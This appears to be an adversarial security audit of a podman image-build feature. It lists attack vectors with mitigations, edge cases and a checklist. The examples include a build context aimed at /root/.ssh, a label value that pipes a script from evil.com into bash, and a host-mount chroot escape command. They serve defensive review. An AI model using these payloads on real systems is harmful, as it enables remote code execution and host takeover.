# Adversarial Audit: Image Lifecycle Feature

**Date:** 2026-09-18  
**Auditor:** Lucien (RapidWebs Agent Team)  
**Scope:** Security vulnerabilities, edge cases, failure modes

---

## Attack Vectors

### 1. Build Context Injection (CRITICAL)

**Attack:** Malicious topology.yaml with:
```yaml
services:
  - id: evil-api
    image: localhost/evil:latest
    image_config:
      build_context: /root/.ssh
      tags: ["authorized_keys"]
```

**Impact:** Build runs as root via sudo, copies SSH keys into container, attacker gains access.

**Mitigation:** 
- Restrict build_context to `/home/*/Workspaces/*` only
- Validate no symlinks escape allowed paths
- Run build as non-root user where possible

### 2. Label Injection (HIGH)

**Attack:** User-controlled labels in topology.yaml:
```yaml
image_config:
  labels:
    USER_INPUT: "$(curl evil.com/shell.sh | bash)"
```

**Impact:** If labels are executed during build, remote code execution.

**Mitigation:**
- Sanitize all label values (alphanumeric + dashes only)
- Never interpolate labels through shell
- Validate label format: `[a-zA-Z0-9_.-]+`

### 3. Podman Socket Access (MEDIUM)

**Attack:** If podman socket is accessible without sudo:
```bash
# Attacker could:
podman run -v /:/host alpine chroot /host bash
```

**Mitigation:**
- Executor already uses `sudo -n` for podman commands
- Verify sudoers configuration includes podman access
- Add check in target_manager for socket permissions

### 4. Image Tampering (MEDIUM)

**Attack:** Compromised registry returns modified image with same tag.

**Mitigation:**
- Use digest pinning for production: `localhost/honcho@sha256:...`
- Implement image signature verification (optional, Phase 2)
- Log all image pulls with timestamps

---

## Edge Cases

### 1. Disk Full During Build
**Symptom:** `podman build` fails with generic error
**Detection:** Check available space before build, provide clear error

### 2. Network Timeout During Pull
**Symptom:** Build hangs indefinitely
**Detection:** Implement timeout with exponential backoff

### 3. Concurrent Builds on Same Node
**Symptom:** Podman lock contention
**Detection:** File-based locking or queue system

### 4. Build Cache Corruption
**Symptom:** Stale layers cause incorrect builds
**Detection:** Validate layer hashes, force rebuild option

### 5. Large Image Push Failure
**Symptom:** 2GB honcho image push times out
**Detection:** Chunked upload, resume capability

---

## Failure Modes

| Scenario | Current Behavior | Required Behavior |
|----------|-----------------|-------------------|
| Image pull fails | Generic error | Retry 3x, clear error message |
| Build fails | Raw podman stderr | Parse exit code, suggest fix |
| Disk full | Cryptic error | Pre-check, clear message |
| Network down | Timeout | Detect, fail fast |
| Auth expired | 401 error | Refresh token hint |

---

## Security Checklist

- [ ] Build context path validation
- [ ] Label value sanitization
- [ ] Sudo configuration verified
- [ ] No secrets in build logs
- [ ] Image digest pinning supported
- [ ] Concurrent build protection
- [ ] Disk space pre-check
- [ ] Timeout handling
- [ ] Credential rotation documented

---

**Audit Complete:** 2026-09-18
